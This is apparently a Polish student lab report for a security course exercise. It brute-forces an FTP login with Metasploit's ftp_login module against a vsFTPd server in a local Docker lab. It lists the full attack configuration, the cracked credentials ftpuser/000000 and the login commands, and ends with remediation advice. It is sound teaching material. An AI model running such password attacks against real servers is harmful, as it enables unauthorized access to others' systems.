# Zadanie 4.5 — FTP Authentication Testing / Bruteforce (`ftp_login`)

> **Cel:** atakiem słownikowym znaleźć poprawne dane logowania do serwera FTP
> (vsFTPd 2.3.4) i zalogować się znalezionym kontem.

| | |
|---|---|
| **Środowisko** | `docker compose -f docker-compose-vsftpd.yml up -d` |
| **Cel (sieć docker)** | `10.10.11.2:21` |
| **Cel (z hosta)** | `127.0.0.1:2121` |
| **Moduł** | `auxiliary/scanner/ftp/ftp_login` |
| **Znalezione** | **`ftpuser` / `000000`** |

## a) Uruchomienie środowiska
```bash
cd ~/Desktop/cyberbezpieczenstwo/lab7_2026-11-23
sudo docker compose -f docker-compose-vsftpd.yml up -d
```
> **Uwaga architektoniczna:** ten compose definiuje własny kontener `metasploit`
> wpięty do sieci `vsftpd-lab` (`10.10.11.x`). Odpalenie go **odtwarza** kontener
> `metasploit` i odłącza go od `ssh-lab` (`10.10.10.x`) — serwery SSH zostają jako
> *orphany*. Dlatego zadania SSH (4.1–4.4, 4.6) i FTP (4.5, 4.7) robi się w
> osobnych blokach, przełączając środowisko.

## c) Wyszukanie modułu
```
search ftp login
use auxiliary/scanner/ftp/ftp_login
```

## Rozpoznanie userów (zawężenie ataku)
Pełny iloczyn `unix_users × unix_passwords` był za wolny (każda próba = osobne
połączenie TCP). Podejrzałem realne konta FTP w wolumenie serwera:
```bash
ls -la ./ftp_data        # katalogi domowe = nazwy userów
# -> admin (uid 1002), ftpuser (uid 1001)
```
i zawęziłem listę userów do tych dwóch:
```bash
sudo docker exec metasploit bash -c 'printf "ftpuser\nadmin\n" > /tmp/ftp_users.txt'
```

## Konfiguracja i atak
```
set RHOSTS 10.10.11.2
set USER_FILE /tmp/ftp_users.txt
set PASS_FILE /usr/src/metasploit-framework/data/wordlists/unix_passwords.txt
set USER_AS_PASS true
set BLANK_PASSWORDS true
set BRUTEFORCE_SPEED 5
set STOP_ON_SUCCESS true
set VERBOSE true
run
```

Wynik:
```
[*] 10.10.11.2:21 - FTP Banner: vsFTPd 2.3.4
[-] 10.10.11.2:21 - Failed: ftpuser:ftpuser ...
[-] 10.10.11.2:21 - Failed: ftpuser:123456 ...
...
[+] 10.10.11.2:21 - Login Successful: ftpuser:000000
[*] Scanned 1 of 1 hosts (100% complete)
```

![ftp_login → ftpuser:000000](screeny/01_ftp_login_success.png)

## d) Logowanie znalezionym kontem (z hosta)
```bash
ftp 127.0.0.1 2121         # login: ftpuser / 000000
# lub:
curl -u ftpuser:000000 ftp://127.0.0.1:2121/
```

![Zalogowany na FTP jako ftpuser](screeny/02_ftp_zalogowany.png)

## Na czym polega błąd
Konto `ftpuser` ma **trywialne hasło** (`000000`) i serwer nie ma ochrony przed
brute-force (brak limitu prób/opóźnień). vsFTPd jako taki działa poprawnie —
podatna jest **słaba polityka haseł**.

## Jak naprawić
- Silne, niesłownikowe hasła; blokada po N nieudanych próbach (fail2ban).
- Ograniczyć konta z dostępem FTP, wyłączyć zbędne (`admin`).
- Najlepiej **FTPS/SFTP** zamiast czystego FTP (hasło leci plaintextem).

## Pliki
- `/tmp/ftp_users.txt` (w kontenerze) — 2 nazwy userów (ftpuser, admin)
- słownik haseł: `unix_passwords.txt` z Metasploita
